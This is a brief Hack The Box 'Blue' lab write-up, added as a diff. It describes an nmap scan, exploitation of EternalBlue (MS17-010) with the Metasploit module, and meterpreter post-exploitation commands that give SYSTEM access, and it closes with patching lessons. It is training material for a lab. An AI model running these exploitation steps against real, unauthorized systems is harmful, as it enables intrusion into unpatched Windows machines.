@@ -1,0 +1,39 @@
+#Hack The Box: "Blue" Challenge Writeup
+#Objective:
+
+The objective was to exploit a Windows machine vulnerable to the EternalBlue (MS17-010) exploit.
+#Step 1: Scanning for Open Ports
+
+-Used nmap to scan the target machine:
+
+    'bash
+    'nmap -A -T4 <target_ip>
+
+Discovered port 445 (SMB) was open.
+
+#Step 2: Exploiting EternalBlue (MS17-010)
+
+The open SMB port suggested the machine was vulnerable to EternalBlue, a well-known exploit for Windows.
+    Used Metasploit to exploit the vulnerability:
+
+    'bash
+    'msfconsole
+    'use exploit/windows/smb/ms17_010_eternalblue
+    'set RHOST <target_ip>
+    'exploit
+
+        Successfully gained SYSTEM access on the target machine.
+
+#Step 3: Post-Exploitation
+
+After gaining access, listed users and explored the system for flags using meterpreter.
+
+    'bash
+    'meterpreter > sysinfo
+    'meterpreter > shell
+
+#Lessons Learned:
+
+    -EternalBlue is still a common vulnerability on unpatched Windows systems.
+    -It's important to ensure critical systems are patched to prevent exploitation by well-known vulnerabilities.
+
